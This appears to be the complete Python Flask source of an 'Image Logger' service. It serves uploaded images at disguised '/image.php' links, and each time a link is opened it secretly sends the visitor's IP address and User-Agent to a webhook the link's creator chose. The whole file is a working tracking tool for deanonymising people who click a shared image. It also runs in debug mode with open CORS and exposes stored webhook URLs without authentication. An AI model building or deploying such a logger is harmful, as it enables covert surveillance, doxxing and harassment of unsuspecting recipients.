from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
import json
import os
from datetime import datetime
import uuid
import base64
from io import BytesIO
import requests as req

app = Flask(__name__, template_folder='templates')
CORS(app)

# Data storage
WEBHOOKS_FILE = "webhooks.json"
MONITORS_FILE = "monitors.json"

def load_data(filename):
    if os.path.exists(filename):
        with open(filename, 'r') as f:
            return json.load(f)
    return {}

def save_data(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/api/webhook', methods=['POST'])
def create_webhook():
    try:
        data = request.json
        webhook_url = data.get('webhook_url')
        image_data = data.get('image_data')
        
        if not webhook_url or not image_data:
            return jsonify({'error': 'Missing webhook_url or image_data'}), 400
        
        webhook_id = str(uuid.uuid4())[:8]
        
        webhooks = load_data(WEBHOOKS_FILE)
        webhooks[webhook_id] = {
            'webhook_url': webhook_url,
            'image_data': image_data,
            'created': datetime.now().isoformat(),
            'monitors': []
        }
        save_data(WEBHOOKS_FILE, webhooks)
        
        return jsonify({
            'webhook_id': webhook_id,
            'image_link': f'/image.php?id={webhook_id}',
            'monitor_link': f'/monitor.php?i={webhook_id}'
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/image.php')
def image_endpoint():
    try:
        webhook_id = request.args.get('id')
        if not webhook_id:
            return jsonify({'error': 'Missing id parameter'}), 400
        
        webhooks = load_data(WEBHOOKS_FILE)
        if webhook_id not in webhooks:
            return jsonify({'error': 'Webhook not found'}), 404
        
        webhook_data = webhooks[webhook_id]
        image_data = webhook_data.get('image_data')
        
        # Log the access
        try:
            req.post(webhook_data['webhook_url'], json={
                'content': f"📸 Image accessed from IP: {request.remote_addr}",
                'embeds': [{
                    'title': 'Image Logger - Access',
                    'description': f'**IP:** {request.remote_addr}\n**User-Agent:** {request.headers.get("User-Agent", "Unknown")}',
                    'timestamp': datetime.now().isoformat()
                }]
            }, timeout=5)
        except:
            pass
        
        if image_data:
            try:
                if ',' in image_data:
                    header, data = image_data.split(',', 1)
                    image_bytes = base64.b64decode(data)
                else:
                    image_bytes = base64.b64decode(image_data)
                
                return send_file(
                    BytesIO(image_bytes),
                    mimetype='image/png',
                    as_attachment=False
                )
            except Exception as e:
                return jsonify({'error': f'Failed to decode image: {str(e)}'}), 500
        else:
            return jsonify({'error': 'No image data found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/monitor.php')
def monitor_endpoint():
    try:
        webhook_id = request.args.get('i')
        if not webhook_id:
            return render_template('monitor.html', webhook_id=None, error='Missing webhook ID', image_data=None)
        
        webhooks = load_data(WEBHOOKS_FILE)
        if webhook_id not in webhooks:
            return render_template('monitor.html', webhook_id=None, error='Webhook not found', image_data=None)
        
        webhook_data = webhooks[webhook_id]
        
        return render_template('monitor.html', 
                             webhook_id=webhook_id,
                             image_data=webhook_data.get('image_data'),
                             created=webhook_data['created'],
                             error=None)
    except Exception as e:
        return render_template('monitor.html', webhook_id=None, error=str(e), image_data=None)

@app.route('/api/monitor-data/<webhook_id>')
def get_monitor_data(webhook_id):
    try:
        webhooks = load_data(WEBHOOKS_FILE)
        if webhook_id not in webhooks:
            return jsonify({'error': 'Not found'}), 404
        
        return jsonify(webhooks[webhook_id])
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
